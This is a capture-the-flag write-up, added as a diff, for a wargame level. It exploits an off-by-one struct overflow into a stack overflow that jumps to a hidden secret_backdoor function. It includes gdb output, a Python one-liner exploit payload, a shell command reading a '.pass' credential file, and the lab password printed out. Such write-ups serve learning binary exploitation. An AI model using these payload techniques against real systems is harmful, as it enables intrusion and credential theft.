@@ -1,0 +1,51 @@
+while reading the assembly code of this level and after following the control flow of the program.
+we noticed a call to two functions set_username, set_msg that has and argument which is
+a struct passed by address
+the first function (set_username) asks for a username and puts it in the struct member name[40]
+we noticed the counter of the loop passed the len of the name by 1 and since it's a struct we 
+can use that to override the other memebers of the struct which is len in this case
+
+so we need to use the last 1 byte and in this case we gonna use '\xff'
+-------------------------------------
+(gdb) run <<< $(python -c "print 'A'*40 + '\xff'")
+Starting program: /home/users/level09/level09 <<< $(python -c "print 'A'*40 + '\xff'")
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
+>>: >: Msg sent!
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000000000000 in ?? ()
+(gdb)
+-------------------------------------
+
+now we need to get the eip address and we gonna use this load:
+  -> AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz
+  -> or calculate it getting the first adress the flow starts, ans that's at rbp-0xc0 and add 8 bytes for the push rbp
+
+ and they both give the offset 200
+
+ so now we have the offset
+
+ we need now to get a shell and we noticed we have a functions not used  that's called secret_backdoor
+ now we need to get the address of secret_backdoor:
+-------------------------------------
+(gdb) x/s secret_backdoor
+0x55555555488c <secret_backdoor>:	 "UH\211\345H\203ĀH\213\005\035\027 "
+(gdb)
+-------------------------------------
+
+now we just need to make everything together:
+-------------------------------------
+level09@OverRide:~$ (python -c "print 'A' * 40 + '\xff' + '\n' + 'A' * 200 + '\x00\x00\x55\x55\x55\x55\x48\x8c'[::-1] + '/bin/sh'"; cat ) | ./level09
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
+>>: >: Msg sent!
+cat /home/users/end/.pass
+j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
+-------------------------------------
